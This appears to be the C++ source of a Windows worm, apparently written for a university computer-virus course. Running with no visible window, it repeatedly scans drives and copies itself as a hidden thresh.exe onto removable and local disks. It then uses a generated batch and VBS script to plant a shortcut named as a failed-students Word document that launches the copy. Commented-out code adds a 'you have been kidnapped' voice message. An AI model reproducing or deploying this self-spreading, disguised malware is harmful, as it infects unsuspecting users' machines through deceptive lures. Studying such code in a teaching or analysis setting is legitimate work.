#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup" )
#include <pthread.h>
#include <stdio.h>
#include <windows.h>
#include <string>
#include<stdio.h>//remove()头文件
#include<stdlib.h>//system()头文件
#include <iostream>

#define maxlen 10  /*For sure, this can be changed*/
#define timeinterval 5000
enum disktype{
	unknown_type,
	error_path,
	portable_path,
	Local_disk,
	Online_disk,
	Cd_RoM,
	RAM
	};

struct list_item{
		char name;
		bool existence;
		unsigned int type;
	};

list_item table[maxlen];
void i_scan()
{
	DWORD dw;
    TCHAR TC[50];
    dw = GetLogicalDrives();

	for(int i = 0 ; i <maxlen;i++ )

		table[i].type = 0;


	for(int i = 0 ; i <maxlen;i++ )
	{
		table[i].name = 'C'+i;
		if( (dw != 0) && (dw >> (i+2)) != 0 )
		{
			table[i].existence = true;
			char hostaddress[5] = "C:\\";
			hostaddress[0] +=i;
			unsigned int type = GetDriveType( hostaddress );
			table[i].type=type;

		}
		else table[i].existence = false;

		//std::cout<<table[i].name<<"  "<<table[i].existence<<"  "<<table[i].type<<'\n';
	}
	return;
}
void create_lnk(char *s1,char *s2)
{
//char *s1="J:/voice.txt"
//,*s2="J:/voice1.txt";
std::string s3 = s1,s4 = s2, ss="@echo off\n"
"echo Dim WshShell,Shortcut>%temp%\\a.vbs\n"
"echo Dim path,fso>>%temp%\\a.vbs\n"
"echo path=\""+s3+"\">>%temp%\\a.vbs\n"
"echo Set fso=CreateObject^(\"Scripting.FileSystemObject\"^)>>%temp%\\a.vbs\n"
"echo Set WshShell=WScript.CreateObject^(\"WScript.Shell\"^)>>%temp%\\a.vbs\n"
"echo Set Shortcut=WshShell.CreateShortCut^(\""+s4+".lnk\"^)>>%temp%\\a.vbs\n"
"echo Shortcut.TargetPath=path>>%temp%\\a.vbs\n"
"echo Shortcut.Save>>%temp%\\a.vbs\n"
"start \"%SystemRoot%\\System32\\WScript.exe\" \"%temp%\\a.vbs\"\n";

//cout<<(ss);
FILE *fw = fopen("create.bat","w+");
fprintf(fw,"%s",ss.c_str());
fclose(fw);
//Sleep(20);
WinExec("create.bat",SW_HIDE);
//Sleep(20);
WinExec("rm create.bat",SW_HIDE);
}

void copy()
{
char *szPath = new char[100];
GetModuleFileName(NULL,szPath,100);
//printf("%s",szPath);
for(int i = 1 ; i<maxlen ; i ++)
{
	if(table[i].type==portable_path || table[i].type == Local_disk)
	{
		char tmp[20] = "C:\\thresh.exe";
		tmp[0] +=i;
		char *d = tmp;
		CopyFile(szPath,d,FALSE);
		char tmp2[20]= "C:\\挂科名单.docx";
		tmp2[0]+=i;
		char *e = tmp2;
		create_lnk(d,e);

//		char tmp2[100]="C:\\Users\\38608\\Desktop\\2020春\\计算机病毒\\大作业\\game.lnk";
//		char *e = tmp2;
//		char tmp3[50]="J:\\game.lnk";
//		char *f =tmp3;
//		CopyFile(e,f,FALSE);

		if(table[i].type==portable_path)
			SetFileAttributes(d,FILE_ATTRIBUTE_HIDDEN);
		else if (table[i].type==Local_disk)
			SetFileAttributes(d,FILE_ATTRIBUTE_SYSTEM);
	}
}
	return;
}
//
//char* copyicon()
//{
//
//char *szPath = new char[100];
//int len = GetModuleFileName(NULL,szPath,100);
//int last= 0;
//for(int i = len;i>0;i--)
//{
//	if(szPath[i]=='\\')
//		{
//			last = i;
//			break;
//		}
//}
//if(!last) return 0;// no '\' in it
//
//for(int i = last+1;i<len;i++)
//{
//	szPath[i]=' ';
//}
//szPath[last+1]='g';
//szPath[last+2]='a';
//szPath[last+3]='m';
//szPath[last+4]='e';
//szPath[last+5]='.';
//szPath[last+6]='l';
//szPath[last+7]='n';
//szPath[last+8]='k';
//std::cout<<szPath;
//		char tmp2[20]= "C:\\gamecenter.lnk";
//		tmp2[0] +=1;
//		char *e =tmp2;
//		CopyFile(szPath,e,FALSE);
//return szPath;
//}



void create_voice()
{
//	FILE *fw = fopen("voice.vbs","w");
//	fprintf(fw,"CreateObject(\"SAPI.SpVoice\").Speak\"你已经被绑架了。\" ");
//	fclose(fw);
//	system("voice.vbs");
//	system("rm voice.vbs");
}

void* rua(void* args)
{
	while(true)
{
	i_scan();
	copy();
//	copyicon();
//	create_voice();
	Sleep(timeinterval);//Low payload
}	return 0;
}

void* greeting(void* args)
{
	system("xxx.exe");
}


int main()
{
pthread_t tids[5];
int ret1 = pthread_create(&tids[0],NULL,rua,NULL);
//int ret2 = pthread_create(&tids[1],NULL,greeting,NULL);

/**Thresh is what we want to run ,
	It may be changed to kidnap.exe~
**/


pthread_exit(NULL);
}


